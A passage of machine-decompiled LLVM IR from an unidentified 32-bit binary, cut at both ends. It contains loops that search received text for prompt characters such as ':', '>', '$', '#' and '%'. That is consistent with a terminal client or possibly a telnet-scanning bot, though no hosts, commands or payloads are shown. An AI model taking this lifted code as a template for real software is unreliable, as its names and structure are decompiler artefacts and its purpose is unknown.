  %v1_804eb38 = add i32 %v0_804f1ff, -1
  %v8_804eb38 = icmp eq i32 %v1_804eb38, 0
  store i32 %v1_804eb38, i32* %eax.global-to-local, align 4
  %v1_804eb39 = icmp eq i1 %v8_804eb38, false
  br i1 %v1_804eb39, label %dec_label_pc_804eb07, label %dec_label_pc_804f20b

dec_label_pc_804eb40:                             ; preds = %dec_label_pc_804ea42
  %v1_804eb40 = add i32 %v0_804ea42, 24
  %v2_804eb40 = inttoptr i32 %v1_804eb40 to i32*
  %v3_804eb40 = load i32, i32* %v2_804eb40, align 4
  %v1_804eb43 = add i32 %v3_804eb40, -1
  store i32 %v1_804eb43, i32* %eax.global-to-local, align 4
  %tmp111 = icmp slt i32 %v1_804eb43, 1
  br i1 %tmp111, label %dec_label_pc_804f0d5, label %dec_label_pc_804eb4c.preheader

dec_label_pc_804eb4c.preheader:                   ; preds = %dec_label_pc_804eb40
  %v7_804eb4c.pre = load i32, i32* @edx, align 4
  %v2_804eb4c = add i32 %v0_804ea42, 28
  br label %dec_label_pc_804eb4c

dec_label_pc_804eb4c:                             ; preds = %dec_label_pc_804eb4c.preheader, %dec_label_pc_804eb74
  %v7_804eb4c = phi i32 [ %v7_804eb4c.pre, %dec_label_pc_804eb4c.preheader ], [ %v9_804eb4c, %dec_label_pc_804eb74 ]
  %v0_804f0c9 = phi i32 [ %v1_804eb43, %dec_label_pc_804eb4c.preheader ], [ %v1_804eb74, %dec_label_pc_804eb74 ]
  %v3_804eb4c = add i32 %v2_804eb4c, %v0_804f0c9
  %v4_804eb4c = inttoptr i32 %v3_804eb4c to i8*
  %v5_804eb4c = load i8, i8* %v4_804eb4c, align 1
  %v6_804eb4c = zext i8 %v5_804eb4c to i32
  %v8_804eb4c = and i32 %v7_804eb4c, -256
  %v9_804eb4c = or i32 %v6_804eb4c, %v8_804eb4c
  store i32 %v9_804eb4c, i32* %edx.global-to-local, align 4
  switch i8 %v5_804eb4c, label %dec_label_pc_804eb74 [
    i8 58, label %dec_label_pc_804f0c9
    i8 62, label %dec_label_pc_804f0c9
    i8 36, label %dec_label_pc_804f0c9
    i8 35, label %dec_label_pc_804f0c9
  ]

dec_label_pc_804eb74:                             ; preds = %dec_label_pc_804eb4c
  %v1_804eb74 = add i32 %v0_804f0c9, -1
  %v8_804eb74 = icmp eq i32 %v1_804eb74, 0
  store i32 %v1_804eb74, i32* %eax.global-to-local, align 4
  %v1_804eb75 = icmp eq i1 %v8_804eb74, false
  br i1 %v1_804eb75, label %dec_label_pc_804eb4c, label %dec_label_pc_804f0d5

dec_label_pc_804eb80:                             ; preds = %dec_label_pc_804ea42
  %v1_804eb80 = add i32 %v0_804ea42, 24
  %v2_804eb80 = inttoptr i32 %v1_804eb80 to i32*
  %v3_804eb80 = load i32, i32* %v2_804eb80, align 4
  %v1_804eb83 = add i32 %v3_804eb80, -1
  store i32 %v1_804eb83, i32* %eax.global-to-local, align 4
  %tmp112 = icmp slt i32 %v1_804eb83, 1
  br i1 %tmp112, label %dec_label_pc_804e9cc.backedge, label %dec_label_pc_804eb8c.preheader

dec_label_pc_804eb8c.preheader:                   ; preds = %dec_label_pc_804eb80
  %v7_804eb8c.pre = load i32, i32* @edx, align 4
  %v2_804eb8c = add i32 %v0_804ea42, 28
  br label %dec_label_pc_804eb8c

dec_label_pc_804eb8c:                             ; preds = %dec_label_pc_804eb8c.preheader, %dec_label_pc_804ebbd
  %v7_804eb8c = phi i32 [ %v7_804eb8c.pre, %dec_label_pc_804eb8c.preheader ], [ %v9_804eb8c, %dec_label_pc_804ebbd ]
  %v0_804f050 = phi i32 [ %v1_804eb83, %dec_label_pc_804eb8c.preheader ], [ %v1_804ebbd, %dec_label_pc_804ebbd ]
  %v3_804eb8c = add i32 %v2_804eb8c, %v0_804f050
  %v4_804eb8c = inttoptr i32 %v3_804eb8c to i8*
  %v5_804eb8c = load i8, i8* %v4_804eb8c, align 1
  %v6_804eb8c = zext i8 %v5_804eb8c to i32
  %v8_804eb8c = and i32 %v7_804eb8c, -256
  %v9_804eb8c = or i32 %v6_804eb8c, %v8_804eb8c
  store i32 %v9_804eb8c, i32* %edx.global-to-local, align 4
  switch i8 %v5_804eb8c, label %dec_label_pc_804ebbd [
    i8 58, label %dec_label_pc_804f050
    i8 62, label %dec_label_pc_804f050
    i8 36, label %dec_label_pc_804f050
    i8 35, label %dec_label_pc_804f050
    i8 37, label %dec_label_pc_804f050
  ]

dec_label_pc_804ebbd:                             ; preds = %dec_label_pc_804eb8c
  %v1_804ebbd = add i32 %v0_804f050, -1
  %v8_804ebbd = icmp eq i32 %v1_804ebbd, 0
  store i32 %v1_804ebbd, i32* %eax.global-to-local, align 4
  %v1_804ebbe = icmp eq i1 %v8_804ebbd, false
  br i1 %v1_804ebbe, label %dec_label_pc_804eb8c, label %dec_label_pc_804e9cc.backedge

dec_label_pc_804ebc5:                             ; preds = %dec_label_pc_804ea42
  %v1_804ebc5 = add i32 %v0_804ea42, 24
  %v2_804ebc5 = inttoptr i32 %v1_804ebc5 to i32*
  %v3_804ebc5 = load i32, i32* %v2_804ebc5, align 4
  %v1_804ebc8 = add i32 %v3_804ebc5, -1
  store i32 %v1_804ebc8, i32* %eax.global-to-local, align 4
  %tmp113 = icmp slt i32 %v1_804ebc8, 1
  br i1 %tmp113, label %dec_label_pc_804e9cc.backedge, label %dec_label_pc_804ebd1.preheader

dec_label_pc_804ebd1.preheader:                   ; preds = %dec_label_pc_804ebc5
  %v7_804ebd1.pre = load i32, i32* @edx, align 4
  %v2_804ebd1 = add i32 %v0_804ea42, 28
  br label %dec_label_pc_804ebd1

dec_label_pc_804ebd1:                             ; preds = %dec_label_pc_804ebd1.preheader, %dec_label_pc_804ec02
  %v7_804ebd1 = phi i32 [ %v7_804ebd1.pre, %dec_label_pc_804ebd1.preheader ], [ %v9_804ebd1, %dec_label_pc_804ec02 ]
  %v0_804f182 = phi i32 [ %v1_804ebc8, %dec_label_pc_804ebd1.preheader ], [ %v1_804ec02, %dec_label_pc_804ec02 ]
  %v3_804ebd1 = add i32 %v2_804ebd1, %v0_804f182
  %v4_804ebd1 = inttoptr i32 %v3_804ebd1 to i8*
  %v5_804ebd1 = load i8, i8* %v4_804ebd1, align 1
  %v6_804ebd1 = zext i8 %v5_804ebd1 to i32
  %v8_804ebd1 = and i32 %v7_804ebd1, -256
  %v9_804ebd1 = or i32 %v6_804ebd1, %v8_804ebd1
  store i32 %v9_804ebd1, i32* %edx.global-to-local, align 4
  switch i8 %v5_804ebd1, label %dec_label_pc_804ec02 [
    i8 58, label %dec_label_pc_804f182
    i8 62, label %dec_label_pc_804f182
    i8 36, label %dec_label_pc_804f182
    i8 35, label %dec_label_pc_804f182
    i8 37, label %dec_label_pc_804f182
  ]

dec_label_pc_804ec02:                             ; preds = %dec_label_pc_804ebd1
  %v1_804ec02 = add i32 %v0_804f182, -1
  %v8_804ec02 = icmp eq i32 %v1_804ec02, 0
  store i32 %v1_804ec02, i32* %eax.global-to-local, align 4
  %v1_804ec03 = icmp eq i1 %v8_804ec02, false
  br i1 %v1_804ec03, label %dec_label_pc_804ebd1, label %dec_label_pc_804e9cc.backedge

dec_label_pc_804ec10:                             ; preds = %dec_label_pc_804ea42
  %v1_804ec10 = add i32 %v0_804ea42, 24
  %v2_804ec10 = inttoptr i32 %v1_804ec10 to i32*
  %v3_804ec10 = load i32, i32* %v2_804ec10, align 4
  %v1_804ec13 = add i32 %v3_804ec10, -1
  store i32 %v1_804ec13, i32* %eax.global-to-local, align 4
  %tmp114 = icmp slt i32 %v1_804ec13, 1
  br i1 %tmp114, label %dec_label_pc_804e9cc.backedge, label %dec_label_pc_804ec1c

dec_label_pc_804ec1c:                             ; preds = %dec_label_pc_804ec10
  %v2_804ec1c = add i32 %v0_804ea42, 27
  %v3_804ec1c = add i32 %v2_804ec1c, %v3_804ec10
  %v4_804ec1c = inttoptr i32 %v3_804ec1c to i8*
  %v5_804ec1c = load i8, i8* %v4_804ec1c, align 1
  %v6_804ec1c = zext i8 %v5_804ec1c to i32
  %v7_804ec1c = load i32, i32* @edx, align 4
  %v8_804ec1c = and i32 %v7_804ec1c, -256
  %v9_804ec1c = or i32 %v8_804ec1c, %v6_804ec1c
  store i32 %v9_804ec1c, i32* %edx.global-to-local, align 4
  switch i8 %v5_804ec1c, label %dec_label_pc_804ec2a [
    i8 62, label %dec_label_pc_804ec4e
    i8 58, label %dec_label_pc_804ec4e
  ]

dec_label_pc_804ec2a:                             ; preds = %dec_label_pc_804ec1c, %dec_label_pc_804ec40
  %v0_804ec39 = phi i32 [ %v1_804ec39, %dec_label_pc_804ec40 ], [ %v1_804ec13, %dec_label_pc_804ec1c ]
  %v7_804ec40 = phi i32 [ %v9_804ec40, %dec_label_pc_804ec40 ], [ %v9_804ec1c, %dec_label_pc_804ec1c ]
  %v1_804ec2a = trunc i32 %v7_804ec40 to i8
  %v1_804ec2a.off = add i8 %v1_804ec2a, -35
  %switch146 = icmp ult i8 %v1_804ec2a.off, 3
  br i1 %switch146, label %dec_label_pc_804ec4e, label %dec_label_pc_804ec39

dec_label_pc_804ec39:                             ; preds = %dec_label_pc_804ec2a
  %v1_804ec39 = add i32 %v0_804ec39, -1
  %v8_804ec39 = icmp eq i32 %v1_804ec39, 0
  store i32 %v1_804ec39, i32* %eax.global-to-local, align 4
  br i1 %v8_804ec39, label %dec_label_pc_804e9cc.backedge, label %dec_label_pc_804ec40

dec_label_pc_804ec40:                             ; preds = %dec_label_pc_804ec39
  %v3_804ec40 = add i32 %v2_804ec1c, %v0_804ec39
  %v4_804ec40 = inttoptr i32 %v3_804ec40 to i8*
  %v5_804ec40 = load i8, i8* %v4_804ec40, align 1
  %v6_804ec40 = zext i8 %v5_804ec40 to i32
  %v8_804ec40 = and i32 %v7_804ec40, -256
  %v9_804ec40 = or i32 %v6_804ec40, %v8_804ec40
  store i32 %v9_804ec40, i32* %edx.global-to-local, align 4
  %v10_804ec44 = icmp ne i8 %v5_804ec40, 58
  %v10_804ec49 = icmp eq i8 %v5_804ec40, 62
  %v1_804ec4c = icmp eq i1 %v10_804ec49, false
  %or.cond143 = and i1 %v10_804ec44, %v1_804ec4c
  br i1 %or.cond143, label %dec_label_pc_804ec2a, label %dec_label_pc_804ec4e

dec_label_pc_804ec4e:                             ; preds = %dec_label_pc_804ec2a, %dec_label_pc_804ec40, %dec_label_pc_804ec1c, %dec_label_pc_804ec1c
  %v0_804ec4e = phi i32 [ %v1_804ec13, %dec_label_pc_804ec1c ], [ %v1_804ec13, %dec_label_pc_804ec1c ], [ %v0_804ec39, %dec_label_pc_804ec2a ], [ %v1_804ec39, %dec_label_pc_804ec40 ]
  %v1_804ec4e = add i32 %v0_804ec4e, 1
  store i32 %v1_804ec4e, i32* %eax.global-to-local, align 4
  %v1_804ec4f = load i32, i32* @esp, align 4
  %v2_804ec4f = add i32 %v1_804ec4f, 32
  %v3_804ec4f = inttoptr i32 %v2_804ec4f to i32*
  store i32 %v1_804ec4e, i32* %v3_804ec4f, align 4
  %v0_804ec53 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ec53 = add i32 %v0_804ec53, 1
  %v8_804ec53 = icmp eq i32 %v1_804ec53, 0
  store i32 %v1_804ec53, i32* %eax.global-to-local, align 4
  br i1 %v8_804ec53, label %dec_label_pc_804e9cc.backedge, label %dec_label_pc_804ec5a

dec_label_pc_804ec5a:                             ; preds = %dec_label_pc_804ec4e
  %v0_804ec5a = load i32, i32* @esp, align 4
  %v1_804ec5a = add i32 %v0_804ec5a, 32
  %v2_804ec5a = inttoptr i32 %v1_804ec5a to i32*
  %v3_804ec5a = load i32, i32* %v2_804ec5a, align 4
  store i32 %v3_804ec5a, i32* @esi, align 4
  %tmp115 = icmp slt i32 %v3_804ec5a, 1
  br i1 %tmp115, label %dec_label_pc_804f038, label %dec_label_pc_804ec66

dec_label_pc_804ec66:                             ; preds = %dec_label_pc_804ec5a
  %v1_804ec69 = add i32 %v0_804ec5a, -16
  %v2_804ec69 = inttoptr i32 %v1_804ec69 to i32*
  store i32 6, i32* %v2_804ec69, align 4
  %v0_804ec6b = call i32 @function_804f740()
  store i32 %v0_804ec6b, i32* %eax.global-to-local, align 4
  %v0_804ec70 = load i32, i32* @esp, align 4
  %v1_804ec70 = inttoptr i32 %v0_804ec70 to i32*
  %v2_804ec70 = load i32, i32* %v1_804ec70, align 4
  store i32 %v2_804ec70, i32* %ecx.global-to-local, align 4
  %v3_804ec70 = add i32 %v0_804ec70, 4
  %v1_804ec71 = inttoptr i32 %v3_804ec70 to i32*
  %v2_804ec71 = load i32, i32* %v1_804ec71, align 4
  store i32 %v2_804ec71, i32* @ebx, align 4
  %v1_804ec72 = add i32 %v0_804ec70, 1888
  store i32 %v1_804ec72, i32* %eax.global-to-local, align 4
  store i32 %v1_804ec72, i32* %v1_804ec71, align 4
  store i32 6, i32* %v1_804ec70, align 4
  %v0_804ec7c = call i32 @function_804f690()
  store i32 %v0_804ec7c, i32* %eax.global-to-local, align 4
  %v0_804ec81 = load i32, i32* @esp, align 4
  %v1_804ec81 = add i32 %v0_804ec81, -4
  %v2_804ec81 = inttoptr i32 %v1_804ec81 to i32*
  store i32 16384, i32* %v2_804ec81, align 4
  %v1_804ec86 = add i32 %v0_804ec81, 1888
  %v2_804ec86 = inttoptr i32 %v1_804ec86 to i32*
  %v3_804ec86 = load i32, i32* %v2_804ec86, align 4
  store i32 %v3_804ec86, i32* %edx.global-to-local, align 4
  %v2_804ec8d = add i32 %v0_804ec81, -8
  %v3_804ec8d = inttoptr i32 %v2_804ec8d to i32*
  store i32 %v3_804ec86, i32* %v3_804ec8d, align 4
  %v2_804ec8e = add i32 %v0_804ec81, -12
  %v3_804ec8e = inttoptr i32 %v2_804ec8e to i32*
  store i32 %v0_804ec7c, i32* %v3_804ec8e, align 4
  %v0_804ec8f = load i32, i32* @edi, align 4
  %v1_804ec8f = add i32 %v0_804ec8f, 4
  %v2_804ec8f = inttoptr i32 %v1_804ec8f to i32*
  %v3_804ec8f = load i32, i32* %v2_804ec8f, align 4
  store i32 %v3_804ec8f, i32* %eax.global-to-local, align 4
  %v2_804ec92 = add i32 %v0_804ec81, -16
  %v3_804ec92 = inttoptr i32 %v2_804ec92 to i32*
  store i32 %v3_804ec8f, i32* %v3_804ec92, align 4
  %v0_804ec93 = call i32 @function_8050966()
  store i32 %v0_804ec93, i32* %eax.global-to-local, align 4
  %v0_804ec98 = load i32, i32* @esp, align 4
  %v1_804ec9b = add i32 %v0_804ec98, 28
  %v2_804ec9b = inttoptr i32 %v1_804ec9b to i32*
  store i32 16384, i32* %v2_804ec9b, align 4
  %v1_804eca0 = add i32 %v0_804ec98, 24
  %v2_804eca0 = inttoptr i32 %v1_804eca0 to i32*
  store i32 2, i32* %v2_804eca0, align 4
  %v1_804eca2 = add i32 %v0_804ec98, 20
  %v2_804eca2 = inttoptr i32 %v1_804eca2 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052b8a.25 to i32), i32* %v2_804eca2, align 4
  %v0_804eca7 = load i32, i32* @edi, align 4
  %v1_804eca7 = add i32 %v0_804eca7, 4
  %v2_804eca7 = inttoptr i32 %v1_804eca7 to i32*
  %v3_804eca7 = load i32, i32* %v2_804eca7, align 4
  %v2_804ecaa = add i32 %v0_804ec98, 16
  %v3_804ecaa = inttoptr i32 %v2_804ecaa to i32*
  store i32 %v3_804eca7, i32* %v3_804ecaa, align 4
  %v0_804ecab = call i32 @function_8050966()
  store i32 %v0_804ecab, i32* %eax.global-to-local, align 4
  %v0_804ecb0 = load i32, i32* @esp, align 4
  %v1_804ecb0 = inttoptr i32 %v0_804ecb0 to i32*
  store i32 6, i32* %v1_804ecb0, align 4
  %v0_804ecb7 = call i32 @function_804f6c0()
  store i32 %v0_804ecb7, i32* %eax.global-to-local, align 4
  %v0_804ecbf = load i32, i32* @edi, align 4
  %v1_804ecbf = add i32 %v0_804ecbf, 12
  %v2_804ecbf = inttoptr i32 %v1_804ecbf to i32*
  store i32 7, i32* %v2_804ecbf, align 4
  br label %dec_label_pc_804ed51

dec_label_pc_804eccb:                             ; preds = %dec_label_pc_804ea42
  %v0_804eccb = load i32, i32* @esp, align 4
  %v1_804ecce = add i32 %v0_804eccb, -16
  %v2_804ecce = inttoptr i32 %v1_804ecce to i32*
  store i32 10, i32* %v2_804ecce, align 4
  %v0_804ecd0 = call i32 @function_804f740()
  store i32 %v0_804ecd0, i32* %eax.global-to-local, align 4
  %v0_804ecd5 = load i32, i32* @esp, align 4
  %v1_804ecd5 = inttoptr i32 %v0_804ecd5 to i32*
  %v2_804ecd5 = load i32, i32* %v1_804ecd5, align 4
  store i32 %v2_804ecd5, i32* %eax.global-to-local, align 4
  %v3_804ecd5 = add i32 %v0_804ecd5, 4
  %v1_804ecd6 = inttoptr i32 %v3_804ecd5 to i32*
  %v2_804ecd6 = load i32, i32* %v1_804ecd6, align 4
  store i32 %v2_804ecd6, i32* %edx.global-to-local, align 4
  %v1_804ecd7 = add i32 %v0_804ecd5, 1880
  store i32 %v1_804ecd7, i32* %ecx.global-to-local, align 4
  store i32 %v1_804ecd7, i32* %v1_804ecd6, align 4
  store i32 10, i32* %v1_804ecd5, align 4
  %v0_804ece1 = call i32 @function_804f690()
  store i32 %v0_804ece1, i32* %eax.global-to-local, align 4
  %v0_804ece6 = load i32, i32* @esp, align 4
  %v1_804ece6 = add i32 %v0_804ece6, 1880
  %v2_804ece6 = inttoptr i32 %v1_804ece6 to i32*
  %v3_804ece6 = load i32, i32* %v2_804ece6, align 4
  %v1_804eced = add i32 %v3_804ece6, -1
  store i32 %v1_804eced, i32* %edx.global-to-local, align 4
  %v2_804ecee = add i32 %v0_804ece6, -4
  %v3_804ecee = inttoptr i32 %v2_804ecee to i32*
  store i32 %v1_804eced, i32* %v3_804ecee, align 4
  %v2_804ecef = add i32 %v0_804ece6, -8
  %v3_804ecef = inttoptr i32 %v2_804ecef to i32*
  store i32 %v0_804ece1, i32* %v3_804ecef, align 4
  %v0_804ecf0 = load i32, i32* @edi, align 4
  %v1_804ecf0 = add i32 %v0_804ecf0, 24
  %v2_804ecf0 = inttoptr i32 %v1_804ecf0 to i32*
  %v3_804ecf0 = load i32, i32* %v2_804ecf0, align 4
  store i32 %v3_804ecf0, i32* %eax.global-to-local, align 4
  %v2_804ecf3 = add i32 %v0_804ece6, -12
  %v3_804ecf3 = inttoptr i32 %v2_804ecf3 to i32*
  store i32 %v3_804ecf0, i32* %v3_804ecf3, align 4
  %v1_804ecf4 = add i32 %v0_804ece6, 32
  %v2_804ecf4 = inttoptr i32 %v1_804ecf4 to i32*
  %v3_804ecf4 = load i32, i32* %v2_804ecf4, align 4
  store i32 %v3_804ecf4, i32* %eax.global-to-local, align 4
  %v2_804ecf8 = add i32 %v0_804ece6, -16
  %v3_804ecf8 = inttoptr i32 %v2_804ecf8 to i32*
  store i32 %v3_804ecf4, i32* %v3_804ecf8, align 4
  %v0_804ecf9 = call i32 @function_804fdc0()
  %v0_804ecfe = load i32, i32* @esp, align 4
  %v1_804ed01 = add i32 %v0_804ecf9, 1
  %v8_804ed01 = icmp eq i32 %v1_804ed01, 0
  store i32 %v1_804ed01, i32* %eax.global-to-local, align 4
  %v1_804f354 = add i32 %v0_804ecfe, 16
  %v2_804f354 = inttoptr i32 %v1_804f354 to i32*
  store i32 10, i32* %v2_804f354, align 4
  %v0_804f356 = call i32 @function_804f6c0()
  store i32 %v0_804f356, i32* %eax.global-to-local, align 4
  %v0_804f35b = load i32, i32* @esp, align 4
  %v1_804f35b = inttoptr i32 %v0_804f35b to i32*
  br i1 %v8_804ed01, label %dec_label_pc_804f351, label %dec_label_pc_804ed08

dec_label_pc_804ed08:                             ; preds = %dec_label_pc_804eccb
  %v2_804ed12 = load i32, i32* %v1_804f35b, align 4
  store i32 %v2_804ed12, i32* %eax.global-to-local, align 4
  %v0_804ed13 = load i32, i32* @edi, align 4
  %v1_804ed13 = add i32 %v0_804ed13, 4
  %v2_804ed13 = inttoptr i32 %v1_804ed13 to i32*
  %v3_804ed13 = load i32, i32* %v2_804ed13, align 4
  store i32 %v3_804ed13, i32* %eax.global-to-local, align 4
  store i32 %v3_804ed13, i32* %v1_804f35b, align 4
  %v1_804ed17 = call i32 @function_8050233(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804ed17, i32* %eax.global-to-local, align 4
  %v0_804ed1c = load i32, i32* @edi, align 4
  %v1_804ed1c = add i32 %v0_804ed1c, 284
  %v2_804ed1c = inttoptr i32 %v1_804ed1c to i8*
  %v3_804ed1c = load i8, i8* %v2_804ed1c, align 1
  %v4_804ed1c = zext i8 %v3_804ed1c to i32
  %v6_804ed1c = and i32 %v1_804ed17, -256
  %v7_804ed1c = or i32 %v4_804ed1c, %v6_804ed1c
  %v1_804ed25 = add i32 %v7_804ed1c, 1
  store i32 %v1_804ed25, i32* %eax.global-to-local, align 4
  %v1_804ed26 = add i32 %v0_804ed1c, 4
  %v2_804ed26 = inttoptr i32 %v1_804ed26 to i32*
  store i32 -1, i32* %v2_804ed26, align 4
  %v0_804ed2d = load i32, i32* %eax.global-to-local, align 4
  %v1_804ed2d = trunc i32 %v0_804ed2d to i8
  %v2_804ed2d = load i32, i32* @edi, align 4
  %v3_804ed2d = add i32 %v2_804ed2d, 284
  %v4_804ed2d = inttoptr i32 %v3_804ed2d to i8*
  store i8 %v1_804ed2d, i8* %v4_804ed2d, align 1
  %v0_804ed33 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ed33 = trunc i32 %v0_804ed33 to i8
  %v10_804ed33 = icmp eq i8 %v1_804ed33, 10
  %v1_804ed35 = icmp eq i1 %v10_804ed33, false
  %v0_804f32b = load i32, i32* @edi, align 4
  br i1 %v1_804ed35, label %dec_label_pc_804f32b, label %dec_label_pc_804ed3b

dec_label_pc_804ed3b:                             ; preds = %dec_label_pc_804ed08
  %v1_804ed3b = add i32 %v0_804f32b, 284
  %v2_804ed3b = inttoptr i32 %v1_804ed3b to i8*
  store i8 0, i8* %v2_804ed3b, align 1
  %v0_804ed42 = load i32, i32* @edi, align 4
  %v1_804ed42 = add i32 %v0_804ed42, 12
  %v2_804ed42 = inttoptr i32 %v1_804ed42 to i32*
  store i32 0, i32* %v2_804ed42, align 4
  %v0_804ed49 = load i32, i32* @esp, align 4
  %v1_804ed49 = add i32 %v0_804ed49, 32
  %v2_804ed49 = inttoptr i32 %v1_804ed49 to i32*
  store i32 -1, i32* %v2_804ed49, align 4
  br label %dec_label_pc_804ed51

dec_label_pc_804ed51:                             ; preds = %dec_label_pc_804f038, %dec_label_pc_804ee91, %dec_label_pc_804edd6, %dec_label_pc_804f3e0, %dec_label_pc_804f32b, %dec_label_pc_804ec66, %dec_label_pc_804f19a, %dec_label_pc_804f064, %dec_label_pc_804f144, %dec_label_pc_804f2d3, %dec_label_pc_804eaef, %dec_label_pc_804ed3b
  %v0_804ed51 = load i32, i32* @edi, align 4
  %v1_804ed51 = add i32 %v0_804ed51, 24
  %v2_804ed51 = inttoptr i32 %v1_804ed51 to i32*
  %v3_804ed51 = load i32, i32* %v2_804ed51, align 4
  store i32 %v3_804ed51, i32* @edx, align 4
  store i32 %v3_804ed51, i32* %eax.global-to-local, align 4
  %v1_804ed56 = load i32, i32* @esp, align 4
  %v2_804ed56 = add i32 %v1_804ed56, 32
  %v3_804ed56 = inttoptr i32 %v2_804ed56 to i32*
  %v4_804ed56 = load i32, i32* %v3_804ed56, align 4
  %v5_804ed56 = sub i32 %v3_804ed51, %v4_804ed56
  %v11_804ed56 = xor i32 %v4_804ed56, %v3_804ed51
  %v12_804ed56 = xor i32 %v5_804ed56, %v3_804ed51
  %v13_804ed56 = and i32 %v12_804ed56, %v11_804ed56
  %v14_804ed56 = icmp slt i32 %v13_804ed56, 0
  %v15_804ed56 = icmp eq i32 %v5_804ed56, 0
  %v16_804ed56 = icmp slt i32 %v5_804ed56, 0
  %v3_804ed5a = icmp ne i1 %v16_804ed56, %v14_804ed56
  %v4_804ed5a = or i1 %v15_804ed56, %v3_804ed5a
  br i1 %v4_804ed5a, label %dec_label_pc_804ed60, label %dec_label_pc_804ed5c

dec_label_pc_804ed5c:                             ; preds = %dec_label_pc_804ed51
  store i32 %v4_804ed56, i32* @edx, align 4
  br label %dec_label_pc_804ed60

dec_label_pc_804ed60:                             ; preds = %dec_label_pc_804ed51, %dec_label_pc_804ed5c
  %v1_804ed60 = phi i32 [ %v3_804ed51, %dec_label_pc_804ed51 ], [ %v4_804ed56, %dec_label_pc_804ed5c ]
  %v2_804ed60 = sub i32 %v3_804ed51, %v1_804ed60
  store i32 %v2_804ed60, i32* %eax.global-to-local, align 4
  store i32 %v2_804ed60, i32* %v2_804ed51, align 4
  %v0_804ed65 = load i32, i32* @esi, align 4
  %v1_804ed65 = load i32, i32* @esp, align 4
  %v2_804ed65 = add i32 %v1_804ed65, -4
  %v3_804ed65 = inttoptr i32 %v2_804ed65 to i32*
  store i32 %v0_804ed65, i32* %v3_804ed65, align 4
  %v0_804ed66 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ed66 = add i32 %v1_804ed65, -8
  %v3_804ed66 = inttoptr i32 %v2_804ed66 to i32*
  store i32 %v0_804ed66, i32* %v3_804ed66, align 4
  %v1_804ed67 = add i32 %v1_804ed65, 16
  %v2_804ed67 = inttoptr i32 %v1_804ed67 to i32*
  %v3_804ed67 = load i32, i32* %v2_804ed67, align 4
  %v1_804ed6b = load i32, i32* @edx, align 4
  %v2_804ed6b = add i32 %v1_804ed6b, %v3_804ed67
  store i32 %v2_804ed6b, i32* %eax.global-to-local, align 4
  %v2_804ed6d = add i32 %v1_804ed65, -12
  %v3_804ed6d = inttoptr i32 %v2_804ed6d to i32*
  store i32 %v2_804ed6b, i32* %v3_804ed6d, align 4
  %v3_804ed6e = load i32, i32* %v2_804ed67, align 4
  store i32 %v3_804ed6e, i32* @ebx, align 4
  %v2_804ed72 = add i32 %v1_804ed65, -16
  %v3_804ed72 = inttoptr i32 %v2_804ed72 to i32*
  store i32 %v3_804ed6e, i32* %v3_804ed72, align 4
  %v4_804ed73 = call i32 @function_8050795(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804ed73, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ea42

dec_label_pc_804ed80:                             ; preds = %dec_label_pc_804ea42
  %v1_804ed80 = add i32 %v0_804ea42, 24
  %v2_804ed80 = inttoptr i32 %v1_804ed80 to i32*
  %v3_804ed80 = load i32, i32* %v2_804ed80, align 4
  %v1_804ed83 = add i32 %v3_804ed80, -1
  store i32 %v1_804ed83, i32* %eax.global-to-local, align 4
  %tmp116 = icmp slt i32 %v1_804ed83, 1
  br i1 %tmp116, label %dec_label_pc_804e9cc.backedge, label %dec_label_pc_804ed8c

dec_label_pc_804ed8c:                             ; preds = %dec_label_pc_804ed80
  %v2_804ed8c = add i32 %v0_804ea42, 27
  %v3_804ed8c = add i32 %v2_804ed8c, %v3_804ed80
  %v4_804ed8c = inttoptr i32 %v3_804ed8c to i8*
  %v5_804ed8c = load i8, i8* %v4_804ed8c, align 1
  %v6_804ed8c = zext i8 %v5_804ed8c to i32
  %v7_804ed8c = load i32, i32* @edx, align 4
  %v8_804ed8c = and i32 %v7_804ed8c, -256
  %v9_804ed8c = or i32 %v8_804ed8c, %v6_804ed8c
  store i32 %v9_804ed8c, i32* %edx.global-to-local, align 4
  switch i8 %v5_804ed8c, label %dec_label_pc_804ed9a [
    i8 62, label %dec_label_pc_804edbe
    i8 58, label %dec_label_pc_804edbe
  ]

dec_label_pc_804ed9a:                             ; preds = %dec_label_pc_804ed8c, %dec_label_pc_804edb0
  %v0_804eda9 = phi i32 [ %v1_804eda9, %dec_label_pc_804edb0 ], [ %v1_804ed83, %dec_label_pc_804ed8c ]
  %v7_804edb0 = phi i32 [ %v9_804edb0, %dec_label_pc_804edb0 ], [ %v9_804ed8c, %dec_label_pc_804ed8c ]
  %v1_804ed9a = trunc i32 %v7_804edb0 to i8
  %v1_804ed9a.off = add i8 %v1_804ed9a, -35
  %switch147 = icmp ult i8 %v1_804ed9a.off, 3
  br i1 %switch147, label %dec_label_pc_804edbe, label %dec_label_pc_804eda9

dec_label_pc_804eda9:                             ; preds = %dec_label_pc_804ed9a
  %v1_804eda9 = add i32 %v0_804eda9, -1
  %v8_804eda9 = icmp eq i32 %v1_804eda9, 0
  store i32 %v1_804eda9, i32* %eax.global-to-local, align 4
  br i1 %v8_804eda9, label %dec_label_pc_804e9cc.backedge, label %dec_label_pc_804edb0

dec_label_pc_804edb0:                             ; preds = %dec_label_pc_804eda9
  %v3_804edb0 = add i32 %v2_804ed8c, %v0_804eda9
  %v4_804edb0 = inttoptr i32 %v3_804edb0 to i8*
  %v5_804edb0 = load i8, i8* %v4_804edb0, align 1
  %v6_804edb0 = zext i8 %v5_804edb0 to i32
  %v8_804edb0 = and i32 %v7_804edb0, -256
  %v9_804edb0 = or i32 %v6_804edb0, %v8_804edb0
  store i32 %v9_804edb0, i32* %edx.global-to-local, align 4
  %v10_804edb4 = icmp ne i8 %v5_804edb0, 58
  %v10_804edb9 = icmp eq i8 %v5_804edb0, 62
  %v1_804edbc = icmp eq i1 %v10_804edb9, false
  %or.cond144 = and i1 %v10_804edb4, %v1_804edbc
  br i1 %or.cond144, label %dec_label_pc_804ed9a, label %dec_label_pc_804edbe

dec_label_pc_804edbe:                             ; preds = %dec_label_pc_804ed9a, %dec_label_pc_804edb0, %dec_label_pc_804ed8c, %dec_label_pc_804ed8c
